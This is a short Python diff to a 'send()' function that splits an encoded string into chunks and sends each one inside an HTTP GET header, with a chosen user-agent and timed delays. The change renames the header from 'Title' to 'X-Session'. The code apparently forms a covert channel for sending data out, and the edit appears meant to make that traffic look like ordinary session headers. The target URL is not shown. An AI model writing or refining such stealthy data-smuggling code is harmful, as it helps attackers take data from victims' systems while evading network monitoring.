@@ -24,11 +24,11 @@ def send():
             data = encoding_string[:size]
             encoding_string = encoding_string[size:]
             r = requests.get(
-                url, headers={'Title': data, 'user-agent': useragent})
+                url, headers={'X-Session': data, 'user-agent': useragent})
             print(r.text)
         else:
             r = requests.get(
-                url, headers={'Title': encoding_string, 'user-agent': useragent})
+                url, headers={'X-Session': encoding_string, 'user-agent': useragent})
             print(r.text)
             break
         time.sleep(delay)
